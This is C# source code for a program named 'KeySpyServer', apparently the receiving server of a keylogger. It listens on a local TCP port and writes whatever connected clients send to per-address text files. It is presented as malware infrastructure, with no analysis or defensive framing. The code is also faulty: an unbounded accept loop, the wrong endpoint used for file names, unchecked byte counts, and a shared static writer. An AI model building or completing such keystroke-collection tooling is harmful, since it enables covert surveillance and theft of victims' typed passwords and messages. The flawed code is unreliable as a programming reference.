using System;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.IO;

namespace KeySpyServer
{
    class Program
    {
        private static Socket socket;
        private static IPEndPoint iPEndPoint;
        private static StreamWriter streamWriter;
        static void Main(string[] args)
        {
            iPEndPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8081);
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Bind(iPEndPoint);
            socket.Listen(1);
            try
            {
                while (true)
                {
                    socket.AcceptAsync().ContinueWith((Task<Socket> t) => {
                        Socket clinetSocket = t.Result;
                        Task ts = null;
                        using (streamWriter = new StreamWriter(((IPEndPoint)clinetSocket.LocalEndPoint).Address.ToString() + ".txt"))
                        {
                            while (true)
                            {
                                byte[] buff = new byte[128];
                                clinetSocket.Receive(buff);
                                ts?.Wait();
                                ts = streamWriter.WriteLineAsync(System.Text.Encoding.ASCII.GetString(buff));
                            }
                        }
                    });
                }
            }
            catch (Exception)
            {
                throw;
            }
            finally {
                socket.Close();
            }
        }
    }
}
